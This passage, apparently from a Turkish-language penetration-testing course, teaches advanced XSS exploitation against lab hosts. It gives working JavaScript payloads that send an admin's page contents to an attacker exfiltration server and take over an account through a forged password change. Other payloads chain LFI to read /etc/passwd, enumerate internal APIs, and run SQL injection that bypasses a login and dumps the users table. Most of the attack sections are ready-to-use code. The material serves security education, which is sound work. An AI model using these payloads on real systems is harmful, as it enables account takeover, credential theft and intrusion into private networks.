Content-Type header'ının yukarıda tartışıldığı gibi `application/json` olmadığını görebiliriz. Ancak, request body geçerli bir JSON'dur ve bu nedenle web uygulaması tarafından ayrıştırılabilir. JSON'a sahte bir key ve sahte bir value ekledik çünkü HMTL payload teknik olarak Content-Type text/plain ile bir request body gönderir ve böylece parametrenin adı ve değeri arasına bir `=` ekler. Sahte key ve sahte value ekleyerek, `=` işaretinin sahte key'e eklenmesini ve payload verilerimizi kirletmemesini sağlayabiliriz. Bu method, web uygulamasının yalnızca JSON kodlu bir request body kabul ettiği durumlarda bile CSRF saldırıları gerçekleştirmemizi sağlar.



### Introduction to XSS Exploitation

HTTP istekleri yapmak, yanıtlarını almak ve kontrolümüz altındaki bir server'a veri sızdırmak için cross-site scripting (XSS) exploitleri kullanabiliriz. Bu nedenle, cross-origin isteklerde bulunan XSS payload'ları yazabilir ve XSS ile CSRF payload'larını birleştirerek kurbanın tüm iç ağı için tehdit oluşturan bir exploit tekniği elde edebiliriz.

Buna ek olarak, web tarayıcılarının, SameSite attribute'u açıkça ayarlanmamışsa cookie için genellikle SameSite `Lax` politikasını uyguladığı gerçeği, CSRF exploit'i yeteneğini önemli ölçüde kısıtlamaktadır. Bu nedenle, XSS ve CSRF'nin birleştirilmesi güçlü bir exploit tekniği olduğunu kanıtlamaktadır.


## HTTPOnly Cookie Flag

Hedef kişilerin session cookie'lerini çalmak, tehdit aktörlerinin XSS açıklarını kullanarak gerçekleştirdikleri en yaygın istismar tekniğidir; ancak bu teknik, session cookie üzerinde HttpOnly attribute'u kullanılarak engellenebilir. Bu özellik, JavaScript kodundan cookie'ye erişimi engeller. Daha spesifik olarak, `document.cookie` dosyasına erişirsek, HTTPOnly attribute'u ayarlanmış cookie'ler mevcut olmayacaktır. Bu, kurbanın session cookie'sinin dışarı sızmasını etkili bir şekilde önler. Bununla birlikte, XSS güvenlik açıklarının ciddiyetini azaltması gerekmez. Bir XSS, kurbanın tarayıcısında, savunmasız web uygulaması içinde ve hedef context'inde keyfi JavaScript kodu çalıştırmamıza izin verdiğinden, session cookie'yi biliyormuşuz gibi aynı eylemleri gerçekleştirebiliriz. Ancak, tarayıcımızda kurbanın session cookie'sini ayarladıktan sonra ilgili eylemleri manuel olarak yapmak yerine bizim için yapması için bir XSS payload'u yazmamız gerekir.


## XSS ile Veri Sızdırma

Bir XSS saldırısının payload'u kurbanın tarayıcısında ve kullanıcı context'inde çalıştırıldığından, saldırganın kurbanın bakış açısından herhangi bir veriye erişmesini sağlar. Bu nedenle, düşük ayrıcalıklı bir saldırgan, kurbanın admin ayrıcalıklarına sahip olması durumunda, savunmasız web uygulamasına admin erişimi elde etmek için bir XSS güvenlik açığını kullanabilir. Bunu, web uygulamasından rastgele veri sızdırmak için kötüye kullanabiliriz.

Kurbanın context'indeki bilgilere erişmek ve exfiltration sunucumuza bilgi sızdırmak için, HTTP istekleri göndermemizi ve yanıtlarla etkileşime girmemizi sağlayan bir [XMLHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest) object'i kullanabiliriz.

Örnek web uygulamamız daha önce gördüğümüz ziyaretçi defteri uygulamasının aynısıdır. Aynı XSS güvenlik açığı hala mevcut. Ancak, bu sefer session cookie `HTTPOnly` bayrağına sahip olduğundan onu çalmamızı engelliyor:

![Pasted image 20241217105538.png](/img/user/resimler/Pasted%20image%2020241217105538.png)

Kurbanın bir admin olduğunu varsayarsak, web uygulaması içindeki herhangi bir fonksiyonun yalnızca adminler tarafından görülebilir olup olmadığını belirlemek için web uygulamasını onların bakış açısından listelemeliyiz. Bunu yapmak için, kurbanın context'inden zaten bildiğimiz endpoint'lere erişelim ve yanıtı exfiltration sunucumuza exfiltrate edelim. Bunu başarmak için, aşağıdaki XSS payload'unu içeren bir ziyaretçi defteri girişi yapabiliriz:

```html
<script src=""http://exploitserver.htb/exploit"></script>
```

Daha sonra, XSS payload'unu yazmak için exploitserver'ı kullanabiliriz. Biz `/home.php` endpoint'ine erişen ve `base64` kodlu response'u exfiltration server'ına exfiltrate eden basit bir payload kullanacağız:

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', '/home.php', false);
xhr.withCredentials = true;
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Not: Daha önce de belirtildiği gibi, kısıtlı URL uzunluğu nedeniyle GET parametresiyle sayfanın tamamına sızmak kötü bir uygulamadır. Daha iyi bir uygulama, bir POST isteğinde veri sızdırmak olacaktır. Daha kısa kod nedeniyle, bu modüldeki çoğu kod örneği GET isteklerini kullanacaktır, ancak alıştırmaları çözerken ve gerçek dünya etkileşimleri sırasında bunu aklınızda bulundurun.

Kurbanın payload'umuzu tetiklemesini bekledikten sonra, exfiltration sunucumuzda base64 kodlu response'u alacağız;

![Pasted image 20241217110040.png](/img/user/resimler/Pasted%20image%2020241217110040.png)

Response'un kodunu çözdükten sonra, düşük ayrıcalıklı kullanıcımızın `/home.php` endpoint'te erişebildiği şeylerle herhangi bir farklılık olup olmadığını görmek için analiz edebiliriz. Yanıtın navigasyon bölümünde `/admin.php` adresindeki admin panosuna bir referans olduğunu ve bu referansın kullanıcımızın context'inde bulunmadığını tespit edebiliriz:

![Pasted image 20241217110224.png](/img/user/resimler/Pasted%20image%2020241217110224.png)

Bunun yerine `/admin.php` endpoint'ine sızmak için exploit sunucusundaki payload'u ayarlayarak, orada görüntülenen potansiyel olarak hassas veriler de dahil olmak üzere admin kontrol paneline sızalım:

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin.php', false);
xhr.withCredentials = true;
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Admin ziyaretçi defterini periyodik olarak ziyaret ettiği ve her seferinde XSS payload'umuzu tetiklediği için ziyaretçi defterine yeni bir giriş göndermiyoruz. Bu, payload kodunun exploit sunucusundan yüklenmesini tetiklediğinden, exploit kodunu orada değiştirmek yeterlidir. Bu, admin tarafından erişilebilen tüm bilgiler dahil olmak üzere tüm admin kontrol paneline sızmamızı sağlar:

![Pasted image 20241217110355.png](/img/user/resimler/Pasted%20image%2020241217110355.png)

# Kurbanın Session'undan Saldırıların Başlatılması

Bir XSS açığı ile kurbanın kullanıcı context'inden nasıl veri sızdırılacağını tartıştıktan sonra, potansiyel olarak state-changing eylemlerinin nasıl tetikleneceğini keşfedeceğiz. XSS bize kurbanın oturumu üzerinde tam kontrol sağladığından, web uygulamasının kurbanın kullanıcı context'inde uyguladığı herhangi bir fonksiyonu tetikleyebiliriz. Bu, kurbanın hesabının tamamen ele geçirilmesine yol açabilir veya başka saldırı vektörlerini etkinleştirebilir.

Bu modül XSS açıklarını tespit etmekten ziyade güçlü XSS exploitleri yazmakla ilgili olduğundan, önceki bölümlerde gördüğümüz aynı savunmasız web uygulamasını ele alacağız.


## Account Takeover

Bu kez örnek web uygulamamız, kullanıcının şifresi de dahil olmak üzere kullanıcı profilini güncellemek için bir fonksiyon içeriyor:

![Pasted image 20241217110827.png](/img/user/resimler/Pasted%20image%2020241217110827.png)

Profilin güncellenmesi aşağıdaki HTTP request'i kullanılarak gerçekleştirilir:

![Pasted image 20241217110907.png](/img/user/resimler/Pasted%20image%2020241217110907.png)

Hesabın şifresinin güncellenmesi eski şifreyi gerektirmediğinden, kurbanın şifresini değiştirmek için bilinen XSS güvenlik açığını kullanabiliriz. Bu, kurbanın hesabına giriş yapmamızı ve tamamen ele geçirmemizi sağlar. Form bir CSRF tokenı kullanılarak korunuyor, ancak bir XSS açığı olduğundan, CSRF tokenını okuyabilir ve isteğe ekleyebiliriz.

Bunu başarmak için, önceki bölümlerde kullandığımız ve exploit sunucusundan JavaScript kodu yükleyen aynı XSS istismarını kullanalım:

```html
<script src=""http://exploitserver.htb/exploit"></script>
```

Ardından, geçerli bir CSRF token alabilmek için **`/home.php`**'ye bir GET isteği gönderebilir, bu token'ı çıkarabilir ve sonrasında kurbanın şifresini **`pwned`** olarak değiştirmek için bir POST isteği gönderebiliriz.

```js
// GET CSRF token
var xhr = new XMLHttpRequest();
xhr.open('GET', '/home.php', false);
xhr.withCredentials = true;
xhr.send();
var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
var csrftoken = encodeURIComponent(doc.getElementById('csrf_token').value);

// change PW
var csrf_req = new XMLHttpRequest();
var params = `username=admin&[email protected]&password=pwned&csrf_token=${csrftoken}`;
csrf_req.open('POST', '/home.php', false);
csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
csrf_req.withCredentials = true;
csrf_req.send(params);
```

Admin kullanıcısının XSS'i tetiklemesini bekledikten sonra, kurbanın hesabına `admin:pwned` kimlik bilgileriyle giriş yapabiliriz.


### Zincirleme Güvenlik Açıkları

Yukarıda gördüğümüz gibi, web uygulaması içindeki herhangi bir fonksiyonu kurbanın kullanıcı context'inden tetiklemek için XSS güvenlik açıklarını kötüye kullanabiliriz. Bir adım daha ileri gidebilir ve web uygulamasındaki farklı bir güvenlik açığından yalnızca kurban tarafından erişilebilen bir endpoint'te yararlanarak birden fazla güvenlik açığını zincirleyebiliriz.

Bunu yapmak için öncelikle web uygulamasını kurbanın bakış açısından analiz etmemiz, kurbanın erişebileceği ve bizim kendi kullanıcı hesabımızla erişemeyeceğimiz endpointleri belirlememiz ve son olarak XSS payload'umuz aracılığıyla belirlediğimiz güvenlik açıklarını test edip kullanmamız gerekir.

Exploit server'ındaki exploit'i özelleştirmemizi sağlayan aynı temel XSS payload'unu tekrar kullanacağız:

```html
<script src=""http://exploitserver.htb/exploit"></script>
```

Kurbanın kullanıcı context'inden `/home.php` endpoint'ine sızmak, kullanıcımız tarafından erişilemeyen `/admin.php` endpoint'ini ortaya çıkarır:

![Pasted image 20241217111530.png](/img/user/resimler/Pasted%20image%2020241217111530.png)

Admin endpoint'inde görüntülenen verileri tanımlamak için, önceki bölümde kullandığımız aynı payload'u response'u exfiltrate etmek için kullanabiliriz:

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin.php', false);
xhr.withCredentials = true;
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Bu, aşağıdaki HTML response'u ortaya çıkarır:

![Pasted image 20241217111640.png](/img/user/resimler/Pasted%20image%2020241217111640.png)

HTML kaynak kodu incelendiğinde, admin endpoint'inin geçerli çalışma dizinindeki farklı dosyalara ayarlanabilen GET parametresi görünümünü desteklediği görülmektedir. Bu, Local File Inclusion (LFI) güvenlik açığı için bariz bir giriş noktasıdır. Hipotezimizi test etmek için, payload'ımızı `/etc/passwd` dosyasını içerecek şekilde ayarlayalım:

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin.php?view=../../../../etc/passwd', false);
xhr.withCredentials = true;
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/lfi?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Kurbanın XSS açığını tekrar tetiklemesini bekledikten sonra, sızıntı sunucumuza sızan dosyamızı içeren aşağıdaki yanıtı alıyoruz:

![Pasted image 20241217111919.png](/img/user/resimler/Pasted%20image%2020241217111919.png)

Not: HTML kodunu lokal bir dosyaya kaydedebilir ve sayfayı görüntülemek için bir web tarayıcısında açabiliriz. Bu, sayfayı doğru şekilde oluşturmak için kod dosyaları veya stil sayfaları gibi ek dosyalar sızdırmamızı gerektirebilir.

### Internal API'leri numaralandırma

Gördüğümüz gibi, XSS güvenlik açıklarını kurbanın kullanıcı context'indeki fonksiyonelliği tetiklemek ve kurbanın erişebildiği verileri dışarı sızdırmak için kullanabiliriz. Bununla birlikte, XSS payload'u kurbanın tarayıcısında çalıştırıldığından, yalnızca kurbanın özel ağında erişilebilen başka web uygulamalarına da saldırmamızı sağlar


### Internal API'nin tanımlanması

Exploit'imiz tıpkı önceki bölümlerde olduğu gibi başlayacaktır. Temel XSS payload'umuzu bir ziyaretçi defteri girişi olarak göndererek başlayacağız:

```html
<script src=""http://exploitserver.htb/exploit"></script>
```

Daha sonra, potansiyel olarak ilginç yalnızca admin fonksiyonelliğini belirlemek için admin endpoint'ine sızacağız:

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin.php', false);
xhr.withCredentials = true;
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Bu da aşağıdaki response'u ortaya çıkarmaktadır:

![Pasted image 20241217132453.png](/img/user/resimler/Pasted%20image%2020241217132453.png)

Gördüğümüz gibi, admin endpoint `http://api.vulnerablesite.htb/` adresindeki bir API'den ek bilgi yüklüyor. Ancak, API'ye erişmeye çalıştığımızda engelleniyoruz, bu da API'ye yalnızca kurbanın local ağından erişilebildiğini gösteriyor:

![Pasted image 20241217132705.png](/img/user/resimler/Pasted%20image%2020241217132705.png)

Bu nedenle, XSS payload'umuzu kurbanın tarayıcısından API'yi numaralandıracak şekilde ayarlamalıyız.

## Enumerating the internal API

Admin endpoint'inde sızdırılan endpoint'i, yani `/v1/sessions` endpoint'ini sızdırarak başlayalım. Bunu XSS payload'umuzu buna göre ayarlayarak yapabiliriz:

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://api.vulnerablesite.htb/v1/sessions', false);
xhr.withCredentials = true;
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Payload'umuzu güncelledikten ve bir süre bekledikten sonra, exfiltration sunucusunda bir şeylerin yanlış gittiğini gösteren ek veri almadık.

Farklı bir origin ile konuştuğumuz için, API Same-Origin politikasını atlamak için uygun CORS header'larını uygulamadığı sürece Same-Origin politikası response'a erişmemizi engeller. Admin endpoint'i API'den cross-origin veri aldığından, API'nin CORS yapılandırmasına sahip olduğunu varsayabiliriz, bu nedenle response'a erişebilmemiz gerekir. Ancak, verileri getiren client-side JavaScript kodunu daha yakından analiz edersek, fetch fonksiyonuna yapılan çağrının credentials: '`include`' setine sahip olmadığını görebiliriz. Öte yandan, payload'umuzda `withCredentials` özelliğini açıkça ayarladık. API, `Access-Control-Allow-Credentials` CORS header'ını ayarlayarak buna izin vermezse, Same-Origin politikası atlanamaz ve bir CORS hatası atılarak response'a erişmemiz engellenir. Bunu aşmak için, sızdırılan `fetch` call'ında ayarlanan parametreleri eşleştirmemiz ve isteği kimlik bilgileri olmadan göndermemiz gerekir:

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://api.vulnerablesite.htb/v1/sessions', false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Bu, CORS sorunlarıyla karşılaşmamak için internal API tarafından beklenen yapılandırmayı tam olarak eşleştirmemiz gerektiğini göstermektedir. API'ye doğrudan ulaşamadığımız ve bu nedenle response'a ayarlanan CORS header'larını belirleyerek CORS yapılandırmasını analiz edemediğimiz için, yapılandırmayı internal API ile iletişimi uygulayan sızdırılmış HTML koduna kopyalamamız gerekir. Bir CORS hatası, sonraki ifadelerin yürütülmesini engeller. Bu nedenle, response'un sızdırılmasını sağlayan doğru CORS yapılandırmasını tanımlamak için bir `try-catch` bloğu kullanılması önerilir. Bu, payload'umuzda daha kolay debugging'i sağlar:

```js
try {
	var xhr = new XMLHttpRequest();
	xhr.open('GET', 'http://api.vulnerablesite.htb/v1/sessions', false);
	xhr.withCredentials = true;
	xhr.send();
	var msg = xhr.responseText;
} catch (error) {
	var msg = error;
}

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(msg), false);
exfil.send();
```

Bu, HTTP isteğimizde bir şeylerin yanlış gittiğini gösteren ve isteğin yapılandırmasını CORS yapılandırmasıyla eşleşecek şekilde değiştirmemize olanak tanıyan aşağıdaki sızan bilgilerle sonuçlanacaktır:

```
NetworkError: Failed to execute 'send' on 'XMLHttpRequest': Failed to load 'http://api.vulnerablesite.htb/v1/sessions'.
```

NetworkError: '`XMLHttpRequest`' üzerinde '`send`' çalıştırılamadı: '`http://api.vulnerablesite.htb/v1/sessions`' yüklenemedi.

Ayrıca, internal API cookie yerine bir kimlik doğrulama taşıyıcısı ile kimlik doğrulama gerektirebilir. Güvenlik açığı bulunan web uygulaması contex'inde kurbanın local depolama alanında depolanan bir kimlik doğrulama taşıyıcısına erişmek için [localStorage](https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage) özelliğini kullanabiliriz. Daha sonra [setRequestHeader](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/setRequestHeader) fonksiyonunu kullanarak `XMLHttpRequest` üzerindeki `Authorization` headerını ayarlayabiliriz.

Not: Beklenen verileri alamadığınızda CORS yapılandırmasıyla ilgili bir sorun veya kimlik doğrulama eksikliği olabileceğini unutmayın.

CORS hatasını önlemek için uygun değişikliği yaptıktan sonra, sızıntı sunucusundan verileri alırız ve daha sonra bunları çözebiliriz:

```shell-session
[!bash!]$ echo -n eyJzZXNzaW9ucyI6W3siYWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTA5LjAuNTQxNC4xMjAgU2FmYXJpLzUzNy4zNiIsInRpbWUiOiIxNjkxNjQ1NzMxIiwidXNlciI6ImFkbWluIn0seyJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDkuMC41NDE0LjEyMCBTYWZhcmkvNTM3LjM2IiwidGltZSI6IjE2OTI1OTYxMzEiLCJ1c2VyIjoiYWRtaW4ifSx7ImFnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwOS4wLjU0MTQuMTIwIFNhZmFyaS81MzcuMzYiLCJ0aW1lIjoiMTY5MzIwMDkzMSIsInVzZXIiOiJhZG1pbiJ9XX0K | base64 -d | jq

{
  "sessions": [
    {
      "agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36",
      "time": "1691645731",
      "user": "admin"
    },
    {
      "agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36",
      "time": "1692596131",
      "user": "admin"
    },
    {
      "agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36",
      "time": "1693200931",
      "user": "admin"
    }
  ]
}
```

Veriler ilginç bilgiler içermediğinden, ek endpointleri tanımlamak için API'yi daha fazla numaralandıralım. Mevcut tüm endpointleri sızıntı sunucusuna sızdıran XSS payload'umuzda bir dizin brute-forcer uygulayarak ek endpointleri belirleyebiliriz. Kavram kanıtımızı `SecLists`'teki [objects-lowercase.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/api/objects-lowercase.txt) kelime listesine dayandıracağız. Payload her bir endpoint'e bir istek gönderecek ve ardından durum kodunu kontrol ederek endpoint'in geçerli olup olmadığını belirleyecektir. Bunu aşağıdakine benzer bir payload ile başarabiliriz:

```js
var endpoints = ['access-token','account','accounts','amount','balance','balances','bar','baz','bio','bios','category','channel','chart','circular','company','content','contract','coordinate','credentials','creds','custom','customer','customers','details','dir','directory','dob','email','employee','event','favorite','feed','foo','form','github','gmail','group','history','image','info','item','job','link','links','location','log','login','logins','logs','map','member','members','messages','money','my','name','names','news','option','options','pass','password','passwords','phone','picture','pin','post','prod','production','profile','profiles','publication','record','sale','sales','set','setting','settings','setup','site','test','theme','token','tokens','twitter','union','url','user','username','users','vendor','vendors','version','website','work','yahoo'];

for (i in endpoints){
	try {
		var xhr = new XMLHttpRequest();
		xhr.open('GET', `http://api.vulnerablesite.htb/v1/${endpoints[i]}`, false);
		xhr.send();
		
		if (xhr.status != 404){
			var exfil = new XMLHttpRequest();
			exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(endpoints[i]), false);
			exfil.send();
		}
	} catch {
		// do nothing
	}
}
```

Bu, mevcut API endpoint'lerini exfiltration sunucusuna sızdırır ve daha sonra bunları daha fazla analiz edebiliriz:

![Pasted image 20241217133823.png](/img/user/resimler/Pasted%20image%2020241217133823.png)

Farklı request methodları veya bruteforce parametreleri deneyerek brute-forcer'ı geliştirebiliriz.


# Exploiting internal Web Applications I

Son bölümde, internal web uygulamalarından veri sızdırmak için bir XSS güvenlik açığını kullanmayı tartıştık. Bu bölümde, kurbanın private network'ünde bulunan tamamen farklı bir web uygulamasındaki güvenlik açığını tespit etmek ve exploit etmek için XSS açığını kullanacağız.


### Güvenlik Açığının Belirlenmesi

Önceki bölümlerde kullanılan aynı temel XSS payload'u ve `/admin.php` endpoint'inin exfiltrasyonu ile başlayacağız. İlgili payload'u önceki bölümlerde tartıştığımız için burada atlayacağız.

Kurban XSS açığını tetiklediğinde, response sızma sunucusuna sızdırılır. Admin endpoint'inin `http://internal.vulnerablesite.htb` adresindeki internal bir web uygulamasına referans içerdiğini görebiliriz:

![Pasted image 20241217134611.png](/img/user/resimler/Pasted%20image%2020241217134611.png)

Sayfaya doğrudan erişmeye çalışırsak engelleniyoruz:

![Pasted image 20241217134637.png](/img/user/resimler/Pasted%20image%2020241217134637.png)

Bu nedenle, son bölümde internal API ile yaptığımız gibi web uygulamasını numaralandırmak için XSS güvenlik açığını kullanalım. Web uygulamasının dizinine sızarak başlayacağız:

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://internal.vulnerablesite.htb/', false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Bu, dizin bir login formundan oluştuğu için internal web uygulamasının kimlik doğrulama ile korunduğunu ortaya koymaktadır:

![Pasted image 20241217134953.png](/img/user/resimler/Pasted%20image%2020241217134953.png)

XSS güvenlik açığı, internal web uygulamasıyla tamamen etkileşime girmemizi sağlar. Varsayılan parolaları deneyebilir veya endpointleri  brute force ile  zorlayabiliriz. Ancak bu bölümde SQL enjeksiyonu güvenlik açığına odaklanacağız. Login formundan, internal web uygulamasının kabul ettiği geçerli bir login POST isteği oluşturabiliriz. Tek bir tırnak işareti içeren bir kullanıcı adı göndererek basit bir SQL enjeksiyonu deneyelim:

```js
var xhr = new XMLHttpRequest();
var params = `uname=${encodeURIComponent("'test")}&pass=x`;
xhr.open('POST', 'http://internal.vulnerablesite.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Bu, internal web uygulamasının SQL enjeksiyonuna karşı savunmasız olduğunu doğrulayan aşağıdaki response'la sonuçlanır:

```html
HTTP 500 - SQL Error
```

## Exploiting the Vulnerability

Oturum açmayı atlayarak ve veritabanını dump ederek SQL injection açığından yararlanacağız.

`' OR '1'='1'-- -` username  ile elde edebileceğimiz kimlik doğrulamasını atlayarak başlayacağız:

```js
var xhr = new XMLHttpRequest();
var params = `uname=${encodeURIComponent("' OR '1'='1' -- -")}&pass=x`;
xhr.open('POST', 'http://internal.vulnerablesite.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Bu, oturum açma sonrası ekranda aşağıdaki bilgileri ortaya çıkarır:

```
(1, 'admin', 'InternalAdmin2023!', 'This is the default admin account.')
```

Veriler username, password ve hesap açıklaması gibi görünüyor. Tüm kullanıcı tablosunu dump ederek bunu doğrulayalım. Veritabanı sistemini, diğer SQL enjeksiyon güvenlik açıkları gibi ortak payloadları numaralandırarak tespit edebiliriz. Bizim durumumuzda, bir SQLite veritabanı ile uğraşıyoruz. Çıktıda dört sütun var gibi göründüğünden, tüm tabloları dump etmek için aşağıdaki payload'u kullanabiliriz:

```js
var xhr = new XMLHttpRequest();
var params = `uname=${encodeURIComponent("' UNION SELECT 1,2,3,group_concat(tbl_name) FROM sqlite_master-- -")}&pass=x`;
xhr.open('POST', 'http://internal.vulnerablesite.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Daha sonra, users tablosunun şemasını dump edebiliriz:

```js
var xhr = new XMLHttpRequest();
var params = `uname=${encodeURIComponent("' UNION SELECT 1,2,3,group_concat(sql) FROM sqlite_master WHERE name='users'-- -")}&pass=x`;
xhr.open('POST', 'http://internal.vulnerablesite.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Bu, aşağıdaki veritabanı şemasını ortaya çıkarır:

```sql
CREATE TABLE `users` (
	`id` int(11) NOT NULL,
	`username` varchar(256) NOT NULL,
	`password` longtext NOT NULL,
	`info` longtext NOT NULL
)
```

Son olarak, users tablosunu aşağıdaki payload ile döngüsel olarak dump edebiliriz:

```js
var xhr = new XMLHttpRequest();
var params = `uname=${encodeURIComponent("' UNION SELECT id,username,password,info FROM users-- -")}&pass=x`;
xhr.open('POST', 'http://internal.vulnerablesite.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Aynı yöntemle veritabanındaki diğer tabloları da dump edebiliriz. Bu, XSS güvenlik açığının ne kadar güçlü olduğunu gösterir, çünkü normalde dışarıdan bir saldırgan tarafından erişilemeyen savunmasız web uygulamalarını hedeflememize olanak tanır. Payload kurbanın tarayıcısında çalıştırıldığından, internal web uygulamalarına da erişilebilir ve böylece hedef alınabilir. 

Not: İnternal web uygulamasında bir CORS yanlış yapılandırması veya savunmasız web uygulamasının internal web uygulamasıyla etkileşime girmesini sağlayan bir CORS yapılandırması olması gerektiğini unutmayın. Aksi takdirde, Same-Origin policy internal web uygulamasından gelen response'a erişimi engeller.


# Exploiting internal Web Applications II

Bir XSS açığı yoluyla internal web uygulamasında bir SQL enjeksiyon açığından nasıl yararlanılacağını tartıştıktan sonra, bu bölümde XSS yoluyla bir command injection açığından nasıl yararlanılacağını inceleyeceğiz. Metodoloji aynı olsa da, süreç karmaşık ancak güçlü olduğu için iyi anlaşılması çok önemlidir. Kapsamlı bir anlayış, karmaşık gerçek dünya güvenlik açıklarının tanımlanmasına yardımcı olabilir.


## Identifying the Vulnerability

Tanımlama süreci, önceki bölümde tartışıldığı gibi temelde aynıdır. Aynı temel XSS payload'unu kullanacağız ve admin endpoint hala `http://internal.vulnerablesite.htb` adresindeki internal web uygulamasına aynı referansı içeriyor. İnternal web uygulamasının dizinine sızmak için aşağıdaki payload'u kullanabiliriz:

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://internal.vulnerablesite.htb/', false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Bu, web uygulamasını farklı web uygulamalarının durumunu kontrol etmek için kullanabileceğimizi gösteren aşağıdaki HTML içeriğini ortaya çıkarır:

![Pasted image 20241217140445.png](/img/user/resimler/Pasted%20image%2020241217140445.png)

Web uygulamasının bu fonksiyonu tam olarak nasıl uyguladığını belirlemek için formu analiz ederek ilgili POST isteğini oluşturabiliriz:

```js
var xhr = new XMLHttpRequest();
var params = `webapp_selector=${encodeURIComponent("http://vulnerablesite.htb")}`;
xhr.open('POST', 'http://internal.vulnerablesite.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Bu da aşağıdaki response'a neden olur:

```http
HTTP/1.1 200 OK
```

Bir hata mesajı oluşturup oluşturamayacağımızı görmek için mevcut olmayan bir domain deneyelim:

```js
var xhr = new XMLHttpRequest();
var params = `webapp_selector=${encodeURIComponent("http://doesnotexist.htb")}`;
xhr.open('POST', 'http://internal.vulnerablesite.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Bu da aşağıdaki response neden olur:

```http
curl: (6) Could not resolve host: doesnotexist.htb
```

